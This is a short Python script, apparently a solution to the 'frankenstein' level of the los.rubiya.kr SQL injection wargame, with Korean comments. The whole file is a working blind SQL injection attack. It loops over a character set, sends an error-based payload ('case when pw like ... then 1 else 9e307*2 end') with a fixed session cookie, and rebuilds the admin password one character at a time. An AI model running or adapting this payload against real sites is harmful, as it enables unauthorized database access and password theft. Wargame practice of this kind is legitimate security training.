#LOS frankenstein

import requests

url ="https://los.rubiya.kr/chall/frankenstein_b5bab23e64777e1756174ad33f14b5db.php?" #공격URL
cookies ={"PHPSESSID": "j4mf4vr3uch8254rolo03tlg6h"} #쿠키값
pw=''
check = ""


string = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_@-`?$^!"

while 1: 
    
    
    for char in string:

        tmp = pw + char+'%'  #9% -> 90% -> 902%
        #print(tmp)

        value = "1' or id='admin' and case when pw like '"+tmp+"' then 1 else 9e307*2 end #".format(char) #injection payload
        parmas = {'pw': value}      #url에 GET으로 전달하는 파라미터
        response = requests.get(url,params=parmas, cookies=cookies)

        print(parmas)
        #print(response.text)

        if ("__FILE__</span>" in  response.text):
            pw = pw + char #9 -> 90 -> 902 (한글자씩 쌓기)
            print("payload:", pw)
            check = 1
            break
            



